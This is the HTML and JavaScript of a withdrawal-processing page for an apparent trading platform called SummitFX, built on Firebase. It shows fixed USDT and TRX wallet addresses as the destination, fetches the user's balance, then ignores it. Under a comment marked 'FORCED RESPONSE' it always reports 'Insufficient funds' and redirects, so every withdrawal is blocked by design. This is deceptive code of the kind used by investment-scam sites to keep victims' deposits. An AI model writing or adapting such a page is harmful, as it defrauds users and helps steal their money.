<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Processing Withdrawal - SummitFX</title>

<style>
body{
    margin:0;
    font-family:Arial;
    background:#0b1220;
    color:white;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.box{
    text-align:center;
    background:#111827;
    padding:25px;
    border-radius:15px;
    width:320px;
}

h2{
    margin-bottom:10px;
}

.pending{
    color:#ffcc00;
    font-weight:bold;
    margin-top:10px;
}

.success{
    color:#00ffcc;
}

.fail{
    color:#ff4d4d;
}

.small{
    font-size:12px;
    color:#aaa;
    margin-top:10px;
    word-break:break-all;
}
</style>
</head>

<body>

<div class="box">

<h2>Withdrawal Request</h2>

<p>Amount: <span id="amount">0</span></p>
<p>Method: <span id="method">-</span></p>

<p class="pending" id="status">Checking balance...</p>

<div class="small" id="wallet"></div>

</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";

import { 
    getAuth, 
    onAuthStateChanged 
} from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";

import { 
    getFirestore, 
    doc, 
    getDoc, 
    updateDoc, 
    arrayUnion,
    collection,
    addDoc
} from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyBXpqaWs6HgOsRRa7nAEsHJ74XWWXuvMQk",
  authDomain: "summitfx-4cb86.firebaseapp.com",
  projectId: "summitfx-4cb86",
  storageBucket: "summitfx-4cb86.firebasestorage.app",
  messagingSenderId: "941382391446",
  appId: "1:941382391446:web:d9198bc79cf26bf82154b7"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

/* WALLET ADDRESSES */
const wallets = {
    usdt: "TLEMJfnDaAqSoGWTG19WRMp2nco3qM6kDW",
    trx: "TADLKQobn7Nea5Zg8NiTQxGwJDP3AzgE9M"
};

/* GET DATA */
const amount = parseFloat(localStorage.getItem("withdrawAmount"));
const method = localStorage.getItem("withdrawMethod");

document.getElementById("amount").innerText = amount;
document.getElementById("method").innerText = method?.toUpperCase();

/* SHOW WALLET */
const wallet = wallets[method];

document.getElementById("wallet").innerText = "Sending to: " + wallet;

/* AUTH CHECK + BALANCE CHECK */
onAuthStateChanged(auth, async (user)=>{

    if(!user){
        window.location = "login.html";
        return;
    }

    const ref = doc(db, "users", user.uid);
    const snap = await getDoc(ref);

    if(!snap.exists()){
        document.getElementById("status").innerText = "User not found";
        return;
    }

    const data = snap.data();
    const balance = data.balance || 0;

    /* 🔴 FORCED RESPONSE */
    document.getElementById("status").innerText = "❌ Insufficient funds";
    document.getElementById("status").className = "fail";

    setTimeout(()=>{
        window.location = "withdraw.html";
    }, 2000);

    return;

});

</script>

</body>
</html>
